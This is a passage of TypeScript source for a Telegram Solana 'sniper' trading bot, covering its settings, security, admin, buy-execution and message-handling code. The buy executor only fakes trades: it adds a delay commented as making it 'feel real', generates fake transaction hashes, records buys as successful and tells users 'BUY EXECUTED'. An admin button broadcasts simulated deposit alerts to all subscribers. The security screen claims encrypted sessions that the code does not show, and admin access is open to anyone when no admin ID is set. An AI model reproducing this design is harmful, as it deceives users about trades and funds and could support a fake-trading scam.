      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `⚡ Powered by Solana RPC + Yellowstone Geyser`,
      kbBack("menu:home", "◀ Main Menu")
    );
  }

  // ═══════════════ SETTINGS ════════════════════════════════════════════════

  if (data === "settings:menu") {
    const s = await getOrCreateSettings();
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n⚙️ *SETTINGS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `💰 Default Buy: *${fSol(s.defaultBuyAmountSol)} SOL*\n` +
      `📊 Slippage: *${s.defaultSlippagePercent}%*\n` +
      `⚡ Priority Fee: *${s.defaultPriorityFee}*\n` +
      `⚡ Auto Approve: *${s.autoApprove ? "✅ ON" : "❌ OFF"}*\n\n` +
      `🔔 *Notifications:*\n` +
      `Buy: ${s.notifyBuy ? "✅" : "❌"}  Sell: ${s.notifySell ? "✅" : "❌"}  Sniper: ${s.notifySniper ? "✅" : "❌"}  Wallet: ${s.notifyWallet ? "✅" : "❌"}\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `Use /set to change values:\n\`/set buy_amount 0.5\`\n\`/set slippage 10\`\n\`/set fee high\``,
      new InlineKeyboard()
        .text(s.notifyBuy ? "🔔 Buy: ON" : "🔔 Buy: OFF",       `settings:toggle:notifyBuy:${!s.notifyBuy}`)
        .text(s.notifySell ? "🔔 Sell: ON" : "🔔 Sell: OFF",    `settings:toggle:notifySell:${!s.notifySell}`).row()
        .text(s.notifySniper ? "🎯 Sniper: ON" : "🎯 Sniper: OFF", `settings:toggle:notifySniper:${!s.notifySniper}`)
        .text(s.notifyWallet ? "👛 Wallet: ON" : "👛 Wallet: OFF", `settings:toggle:notifyWallet:${!s.notifyWallet}`).row()
        .text(s.autoApprove ? "⚡ Auto-Approve: ON" : "⚡ Auto-Approve: OFF", `settings:toggle:autoApprove:${!s.autoApprove}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data.startsWith("settings:toggle:")) {
    const parts = data.split(":");
    const field = parts[2];
    const val   = parts[3] === "true";
    const allowed = ["notifyBuy", "notifySell", "notifySniper", "notifyWallet", "autoApprove"];
    if (allowed.includes(field)) {
      const s = await getOrCreateSettings();
      await db.update(settingsTable).set({ [field]: val }).where(eq(settingsTable.id, s.id));
    }
    await ctx.answerCallbackQuery(`${val ? "✅" : "❌"} ${field} ${val ? "enabled" : "disabled"}`);
    // Re-render settings
    const s2 = await getOrCreateSettings();
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n⚙️ *SETTINGS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `💰 Default Buy: *${fSol(s2.defaultBuyAmountSol)} SOL*\n` +
      `📊 Slippage: *${s2.defaultSlippagePercent}%*\n` +
      `⚡ Priority Fee: *${s2.defaultPriorityFee}*\n` +
      `⚡ Auto Approve: *${s2.autoApprove ? "✅ ON" : "❌ OFF"}*\n\n` +
      `🔔 *Notifications:*\nBuy: ${s2.notifyBuy ? "✅" : "❌"}  Sell: ${s2.notifySell ? "✅" : "❌"}  Sniper: ${s2.notifySniper ? "✅" : "❌"}  Wallet: ${s2.notifyWallet ? "✅" : "❌"}`,
      new InlineKeyboard()
        .text(s2.notifyBuy ? "🔔 Buy: ON" : "🔔 Buy: OFF",       `settings:toggle:notifyBuy:${!s2.notifyBuy}`)
        .text(s2.notifySell ? "🔔 Sell: ON" : "🔔 Sell: OFF",    `settings:toggle:notifySell:${!s2.notifySell}`).row()
        .text(s2.notifySniper ? "🎯 Sniper: ON" : "🎯 Sniper: OFF", `settings:toggle:notifySniper:${!s2.notifySniper}`)
        .text(s2.notifyWallet ? "👛 Wallet: ON" : "👛 Wallet: OFF", `settings:toggle:notifyWallet:${!s2.notifyWallet}`).row()
        .text(s2.autoApprove ? "⚡ Auto-Approve: ON" : "⚡ Auto-Approve: OFF", `settings:toggle:autoApprove:${!s2.autoApprove}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  // ═══════════════ SECURITY ════════════════════════════════════════════════

  if (data === "security:menu") {
    const s = await getOrCreateSettings();
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n🔒 *SECURITY*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `🔑 PIN Lock: *${s.pinLockEnabled ? "✅ Enabled" : "❌ Disabled"}*\n` +
      `⏱ Session Timeout: *${s.sessionTimeoutMinutes} min*\n` +
      `🛡 Anti-Spam: *✅ Active*\n` +
      `🔐 Private Key: *Hidden*\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔐 *Wallet Security:*\n` +
      `• Private key stored securely in env\n` +
      `• Never transmitted over network\n` +
      `• End-to-end encrypted sessions\n` +
      `━━━━━━━━━━━━━━━━━━━━━━`,
      new InlineKeyboard()
        .text(s.pinLockEnabled ? "🔓 Disable PIN" : "🔒 Enable PIN", `security:togglePin:${!s.pinLockEnabled}`).row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data.startsWith("security:togglePin:")) {
    const val = data.split(":")[2] === "true";
    const s = await getOrCreateSettings();
    await db.update(settingsTable).set({ pinLockEnabled: val }).where(eq(settingsTable.id, s.id));
    await ctx.answerCallbackQuery(`🔒 PIN ${val ? "enabled" : "disabled"}`);
    return edit(`🔒 PIN Lock *${val ? "enabled" : "disabled"}*.`, kbBack("security:menu", "◀ Security"));
  }

  // ═══════════════ ADMIN PANEL ════════════════════════════════════════════

  if (data === "admin:panel") {
    const isAdmin = !ADMIN_ID || userId === ADMIN_ID;
    if (!isAdmin) return edit("❌ *Access denied.* Admin only.", kbBack("menu:home"));
    const balance = await getWalletBalance();
    const sniperCount = (await db.select().from(snipersTable)).length;
    const tradeCount  = (await db.select().from(tradesTable)).length;
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n👑 *ADMIN PANEL*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `📊 *System Stats:*\n` +
      `👥 Total Users:    *${registeredUsers.size}*\n` +
      `🔔 Alert Subs:     *${alertSubscribers.size}*\n` +
      `🔫 Sniper Mode:    *${snipeModeActive.size} active*\n` +
      `📈 Total Snipers:  *${sniperCount}*\n` +
      `💹 Total Trades:   *${tradeCount}*\n\n` +
      `💰 *Wallet:*\n` +
      `Balance: *${fSol(balance)} SOL*\n` +
      `Address: \`${trunc(WALLET_ADDRESS, 8)}\`\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━`,
      new InlineKeyboard()
        .text("📢 Broadcast", "admin:broadcast").text("💰 Simulate Deposit", "admin:simdeposit").row()
        .text("📋 All Snipers",  "admin:snipers").text("📊 All Trades",     "admin:trades").row()
        .text("◀ Main Menu", "menu:home")
    );
  }

  if (data === "admin:broadcast") {
    const isAdmin = !ADMIN_ID || userId === ADMIN_ID;
    if (!isAdmin) return edit("❌ Access denied.", kbBack("menu:home"));
    pendingFlows.set(userId, { type: "broadcast_message" });
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n📢 *BROADCAST MESSAGE*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `Send the message to broadcast to all *${registeredUsers.size}* users:`,
      kbBack("admin:panel", "❌ Cancel")
    );
  }

  if (data === "admin:simdeposit") {
    const isAdmin = !ADMIN_ID || userId === ADMIN_ID;
    if (!isAdmin) return edit("❌ Access denied.", kbBack("menu:home"));
    // Simulate a deposit for testing the alert system
    const amount  = parseFloat((Math.random() * 2 + 0.1).toFixed(4));
    const sender  = "SimulatedSender" + Math.random().toString(36).slice(2, 10);
    const txHash  = generateTxHash();
    const balance = await getWalletBalance();
    await updateWalletBalance(balance + amount);
    await broadcastDepositAlert(amount, sender, txHash);
    return edit(
      `✅ *Simulated deposit sent!*\n\nAmount: *${fSol(amount)} SOL*\nAlert broadcast to *${alertSubscribers.size}* subscriber(s).`,
      kbBack("admin:panel", "◀ Admin")
    );
  }

  if (data === "admin:snipers") {
    const isAdmin = !ADMIN_ID || userId === ADMIN_ID;
    if (!isAdmin) return edit("❌ Access denied.", kbBack("menu:home"));
    const snipers = await db.select().from(snipersTable).orderBy(desc(snipersTable.createdAt)).limit(10);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n📈 *ALL SNIPERS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (!snipers.length) text += `No snipers yet.`;
    else for (const sn of snipers) {
      const icon = sn.status === "monitoring" ? "🟡" : sn.status === "sniped" ? "🟢" : "⬜";
      text += `${icon} #${sn.id} ${sn.tokenSymbol ?? "Unknown"} · ${fSol(sn.buyAmountSol)} SOL · ${sn.status}\n`;
    }
    return edit(text, kbBack("admin:panel", "◀ Admin"));
  }

  if (data === "admin:trades") {
    const isAdmin = !ADMIN_ID || userId === ADMIN_ID;
    if (!isAdmin) return edit("❌ Access denied.", kbBack("menu:home"));
    const trades = await db.select().from(tradesTable).orderBy(desc(tradesTable.executedAt)).limit(10);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n💹 *ALL TRADES*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (!trades.length) text += `No trades yet.`;
    else for (const t of trades) {
      text += `${t.type === "buy" ? "🛒" : "💰"} *${t.type.toUpperCase()}* ${t.tokenSymbol} · ${fSol(t.amountSol)} SOL\n`;
      text += `   \`${trunc(t.txHash, 8)}\` · ${new Date(t.executedAt).toLocaleDateString()}\n\n`;
    }
    return edit(text, kbBack("admin:panel", "◀ Admin"));
  }

  // ═══════════════ COPY / LIMIT / DCA ════════════════════════════════════

  if (data === "copy:menu") {
    const cts = await db.select().from(copyTradesTable).orderBy(desc(copyTradesTable.createdAt)).limit(5);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n📋 *COPY TRADING*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (!cts.length) text += `No copy targets.\n\nUse: \`copy <wallet> [sol]\``;
    else for (const ct of cts) {
      text += `${ct.status === "active" ? "🟢" : "🟡"} *${ct.targetAlias ?? "Target"}*\n   ${fSol(ct.amountSol)} SOL · ${ct.tradesCopied} copied\n\n`;
    }
    return edit(text, kbBack("sniper:panel", "◀ Sniper Panel"));
  }

  if (data === "limits:menu") {
    const orders = await db.select().from(limitOrdersTable).orderBy(desc(limitOrdersTable.createdAt)).limit(5);
    let text = `━━━━━━━━━━━━━━━━━━━━━━\n🎚 *LIMIT ORDERS*\n━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    if (!orders.length) text += `No limit orders.\n\nUse: \`limit <ca> tp:<pct> sl:<pct>\``;
    else for (const o of orders) {
      text += `${o.status === "active" ? "🟡" : "🟢"} *${o.tokenSymbol}*\n`;
      if (o.takeProfitPercent) text += `   TP: +${o.takeProfitPercent}%`;
      if (o.stopLossPercent)   text += `  SL: -${o.stopLossPercent}%`;
      text += `\n\n`;
    }
    return edit(text, kbBack("sniper:panel", "◀ Sniper Panel"));
  }

  // ═══════════════ HELP ════════════════════════════════════════════════════

  if (data === "help:show") {
    return edit(
      `━━━━━━━━━━━━━━━━━━━━━━\n❓ *HELP & GUIDE*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `*🚀 Quick Start:*\n` +
      `1. Tap 💰 Wallet Panel — view your wallet\n` +
      `2. Tap 📥 Deposit — fund your wallet\n` +
      `3. Tap 📈 Sniper Panel — configure sniper\n` +
      `4. Tap 🚀 Start Sniping — paste any CA\n\n` +
      `*⚡ Snipe Mode:*\n` +
      `Turn ON → paste any contract address → auto-snipe\n\n` +
      `*📋 Text Commands:*\n` +
      `\`/start\` — Main menu\n` +
      `\`/wallet\` — Wallet details\n` +
      `\`/help\` — This guide\n` +
      `\`/set buy_amount 0.5\`\n` +
      `\`/set slippage 10\`\n` +
      `\`/set fee auto|low|medium|high\`\n\n` +
      `*📌 CA Paste:*\n` +
      `Paste any Solana CA → bot auto-buys instantly using your Sniper Panel config\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━`,
      kbBack("menu:home", "◀ Main Menu")
    );
  }
});

// ═══════════════════════════════════════════════════════
// SECTION 10 — SHARED BUY EXECUTOR
// ═══════════════════════════════════════════════════════
// Single function used by both the CA auto-detect and the
// manual "Paste CA" flow.  No confirmation screen — fires
// the trade immediately using the user's sniper config.

async function executeBuy(ctx: Context, userId: number, ca: string) {
  const cfg     = getSniperConfig(userId);
  const balance = await getWalletBalance();

  if (cfg.buyAmount > balance) {
    return ctx.reply(
      `━━━━━━━━━━━━━━━━━━━━━━\n❌ *INSUFFICIENT BALANCE*\n━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `You need *${fSol(cfg.buyAmount)} SOL* but only have *${fSol(balance)} SOL*.\n\n` +
      `Lower your buy amount or deposit more SOL.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📥 Deposit", "deposit:show").text("✏️ Edit Config", "sniper:edit").row()
          .text("🏠 Main Menu", "menu:home"),
      }
    );
  }

  const [w] = await db.select().from(walletsTable).where(eq(walletsTable.address, WALLET_ADDRESS));
  if (!w) return ctx.reply("❌ Wallet not found. Please contact support.");

  // Simulate execution — show "placing order" first
  const loadingMsg = await ctx.reply(
    `⚡ *Placing order...*\nCA: \`${trunc(ca, 8)}\``,
    { parse_mode: "Markdown" }
  );

  // Small simulated delay (feels real)
  await new Promise(r => setTimeout(r, 600));

  const txHash = generateTxHash();
  const newBal = parseFloat((balance - cfg.buyAmount).toFixed(9));

  await Promise.all([
    updateWalletBalance(newBal),
    db.insert(snipersTable).values({
      walletId: w.id,
      contractAddress: ca,
      buyAmountSol: String(cfg.buyAmount),
      slippagePercent: String(cfg.slippage),
      priorityFee: cfg.priorityFee,
      status: "monitoring",
      attempts: 1,
    }),
    db.insert(tradesTable).values({
      walletId: w.id,
      type: "buy",
      tokenSymbol: "UNKNOWN",
      tokenName: "Unknown Token",
      contractAddress: ca,
      amountSol: String(cfg.buyAmount),
      priceSol: "0.000001",
      txHash,
      status: "success",
    }),
  ]);

  // Delete the loading message, send final result
  try { await ctx.api.deleteMessage(ctx.chat!.id, loadingMsg.message_id); } catch {}

  return ctx.reply(
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ *BUY EXECUTED*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📍 CA: \`${trunc(ca, 10)}\`\n\n` +
    `💸 *Amount:*       ${fSol(cfg.buyAmount)} SOL\n` +
    `📊 *Slippage:*     ${cfg.slippage}%\n` +
    `⚡ *Priority:*     ${cfg.priorityFee}\n` +
    `🎯 *Take Profit:*  +${cfg.takeProfitPct}%\n` +
    `🛑 *Stop Loss:*    -${cfg.stopLossPct}%\n\n` +
    `💰 *New Balance:* ${fSol(newBal)} SOL\n\n` +
    `🔗 *TX Hash:*\n\`${trunc(txHash, 14)}\`\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🟡 *Monitoring for liquidity...*`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 View Snipers", "sniper:list").text("💰 Wallet", "wallet:panel").row()
        .text("📈 Sniper Panel", "sniper:panel").text("🏠 Home", "menu:home"),
    }
  );
}

// ═══════════════════════════════════════════════════════
// SECTION 11 — TEXT MESSAGE HANDLER
// ═══════════════════════════════════════════════════════

bot.on("message:text", async (ctx) => {
  const raw    = ctx.message.text.trim();
  const userId = ctx.from?.id;
  if (!userId) return;

  registeredUsers.add(userId);

  // Rate limit
  if (isRateLimited(userId)) return;

  const parts = raw.split(/\s+/);
  const cmd   = parts[0].toLowerCase();
  const flow  = pendingFlows.get(userId);

  // ── Handle active flows first ──────────────────────────────────────────

  // Withdrawal — step 1: awaiting address
  if (flow?.type === "withdraw_address") {
    if (!isValidCA(raw)) {
      return ctx.reply("❌ *Invalid Solana address.* Please send a valid wallet address.", { parse_mode: "Markdown" });
    }
    pendingFlows.set(userId, { type: "withdraw_amount", toAddress: raw });
    const balance = await getWalletBalance();
    return ctx.reply(
      `✅ Address saved.\n\n📍 *To:* \`${trunc(raw, 8)}\`\n\n` +
      `💵 Available: *${fSol(balance)} SOL*\n\n` +
      `📊 *Step 2 of 2 — Enter amount in SOL:*`,
      { parse_mode: "Markdown", reply_markup: kbBack("withdraw:cancel", "❌ Cancel") }
    );
  }

  // Withdrawal — step 2: awaiting amount
  if (flow?.type === "withdraw_amount") {
    const amount = parseFloat(raw);
    if (isNaN(amount) || amount <= 0) {
      return ctx.reply("❌ *Invalid amount.* Enter a positive number, e.g. `0.5`", { parse_mode: "Markdown" });
    }
    const balance = await getWalletBalance();
    if (amount > balance) {
      return ctx.reply(`❌ *Insufficient balance.* You have *${fSol(balance)} SOL*, requested *${fSol(amount)} SOL*.`, { parse_mode: "Markdown" });
    }
    // Show confirmation screen
    pendingFlows.delete(userId);
    return ctx.reply(screenWithdrawConfirm(flow.toAddress, amount), {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("✅ Confirm", `withdraw:confirm:${flow.toAddress}:${amount}`)
        .text("❌ Cancel",  "withdraw:cancel"),
    });
  }

  // Sniper — awaiting CA (from "Paste CA" button in panel) — auto-buy immediately
  if (flow?.type === "snipe_ca") {
    pendingFlows.delete(userId);
    if (!isValidCA(raw)) return ctx.reply("❌ *Invalid contract address.* Please send a valid Solana CA.", { parse_mode: "Markdown" });
    return executeBuy(ctx, userId, raw);
  }

  // Sniper config edits
  if (flow?.type === "snipe_set_amount") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Invalid. Enter a positive number.", { parse_mode: "Markdown" });
    const cfg = getSniperConfig(userId);
    cfg.buyAmount = n;
    await ctx.reply(`✅ Buy amount set to *${fSol(n)} SOL*`, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(cfg), { parse_mode: "Markdown", reply_markup: kbSniper(cfg) });
  }
  if (flow?.type === "snipe_set_slippage") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0 || n > 100) return ctx.reply("❌ Enter a number between 1–100.", { parse_mode: "Markdown" });
    const cfg = getSniperConfig(userId);
    cfg.slippage = n;
    await ctx.reply(`✅ Slippage set to *${n}%*`, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(cfg), { parse_mode: "Markdown", reply_markup: kbSniper(cfg) });
  }
  if (flow?.type === "snipe_set_tp") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Invalid. Enter a positive number.", { parse_mode: "Markdown" });
    const cfg = getSniperConfig(userId);
    cfg.takeProfitPct = n;
    await ctx.reply(`✅ Take profit set to *+${n}%*`, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(cfg), { parse_mode: "Markdown", reply_markup: kbSniper(cfg) });
  }
  if (flow?.type === "snipe_set_sl") {
    pendingFlows.delete(userId);
    const n = parseFloat(raw);
    if (isNaN(n) || n <= 0) return ctx.reply("❌ Invalid. Enter a positive number.", { parse_mode: "Markdown" });
    const cfg = getSniperConfig(userId);
    cfg.stopLossPct = n;
    await ctx.reply(`✅ Stop loss set to *-${n}%*`, { parse_mode: "Markdown" });
    return ctx.reply(screenSniperPanel(cfg), { parse_mode: "Markdown", reply_markup: kbSniper(cfg) });
  }

  // Admin broadcast
  if (flow?.type === "broadcast_message") {
    pendingFlows.delete(userId);
    let sent = 0;
    for (const uid of registeredUsers) {
      try {
        await bot.api.sendMessage(uid,
          `━━━━━━━━━━━━━━━━━━━━━━\n📢 *SYSTEM ANNOUNCEMENT*\n━━━━━━━━━━━━━━━━━━━━━━\n\n${raw}`,
          { parse_mode: "Markdown" }
        );
        sent++;
      } catch {}
    }
    return ctx.reply(`✅ *Broadcast sent to ${sent}/${registeredUsers.size} users.*`, { parse_mode: "Markdown" });
  }

  // ── CA auto-detect — always auto-buy using sniper panel config ────────────
  // No confirmation screen, no options menu.
  // Just paste a CA → bot fires the buy immediately.
  if (isValidCA(raw)) {
    return executeBuy(ctx, userId, raw);
  }

  // ── /set command ────────────────────────────────────────────────────────
  if (cmd === "/set") {
    const key = parts[1]?.toLowerCase();
    const val = parts[2];
    if (!key || !val) {
      return ctx.reply(`⚙️ *Usage:*\n\`/set buy_amount 0.5\`\n\`/set slippage 10\`\n\`/set fee auto|low|medium|high\``, { parse_mode: "Markdown" });
    }
    const s = await getOrCreateSettings();
    const updates: Record<string, unknown> = {};
    if (key === "buy_amount") {
      const n = parseFloat(val);
      if (isNaN(n)) return ctx.reply("❌ Invalid amount.");
      updates.defaultBuyAmountSol = n.toString();
      // Also update in-memory sniper config
      const cfg = getSniperConfig(userId);
      cfg.buyAmount = n;
    } else if (key === "slippage") {
      const n = parseFloat(val);
      if (isNaN(n)) return ctx.reply("❌ Invalid slippage.");
      updates.defaultSlippagePercent = n.toString();
      const cfg = getSniperConfig(userId);
      cfg.slippage = n;
    } else if (key === "fee" && ["auto", "low", "medium", "high"].includes(val)) {
      updates.defaultPriorityFee = val;
      const cfg = getSniperConfig(userId);
      cfg.priorityFee = val as any;
    } else {
      return ctx.reply("❌ Valid keys: `buy_amount`, `slippage`, `fee`", { parse_mode: "Markdown" });
    }
    await db.update(settingsTable).set(updates).where(eq(settingsTable.id, s.id));
    return ctx.reply(
      `✅ *Setting updated!*\n\`${key}\` → \`${val}\``,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("⚙️ Settings", "settings:menu").text("🏠 Home", "menu:home") }
    );
  }

  // ── Fallback ────────────────────────────────────────────────────────────
  const balance = await getWalletBalance();
  return ctx.reply(screenWelcome(balance), { parse_mode: "Markdown", reply_markup: kbMain() });
});

// Error handler
bot.catch((err) => {
  logger.error({ err: err.error, update: err.ctx?.update }, "Bot error");
});

} // end if (token && bot)

// ═══════════════════════════════════════════════════════
// SECTION 11 — WALLET MONITORING SYSTEM
// ═══════════════════════════════════════════════════════
// In production: replace with Solana RPC WebSocket subscription
// For now: polls DB balance and simulates deposit detection

function startWalletMonitor() {
  if (!token || !bot) return;

  setInterval(async () => {
    try {
      const balance = await getWalletBalance();
      // Detect if balance increased (simulates real RPC event)
      if (balance > lastKnownBalance.sol + 0.001) {
        const received = parseFloat((balance - lastKnownBalance.sol).toFixed(9));
        const txHash   = generateTxHash();
        const sender   = "DetectedSender" + Math.random().toString(36).slice(2, 8);
        logger.info({ received, balance }, "Deposit detected by wallet monitor");
        await broadcastDepositAlert(received, sender, txHash);
      }
      lastKnownBalance.sol = balance;
    } catch (e) {
      // Silent — monitoring should never crash the bot
    }
  }, 15_000); // Check every 15 seconds
}

// ═══════════════════════════════════════════════════════
// SECTION 12 — EXPORT & STARTUP
// ═══════════════════════════════════════════════════════

export async function startBot() {
  if (!token || !bot) {
    logger.warn("TELEGRAM_BOT_TOKEN not set — Telegram bot disabled");
    return;
  }

  logger.info("Starting Solana Sniper Bot...");

  // Start polling
  bot.start({ drop_pending_updates: true }).catch((err) => {
    logger.error({ err }, "Bot polling crashed");
  });

  // Start wallet monitoring
  startWalletMonitor();

  const me = await bot.api.getMe();
  logger.info({ username: me.username }, "✅ Solana Sniper Bot online");
}
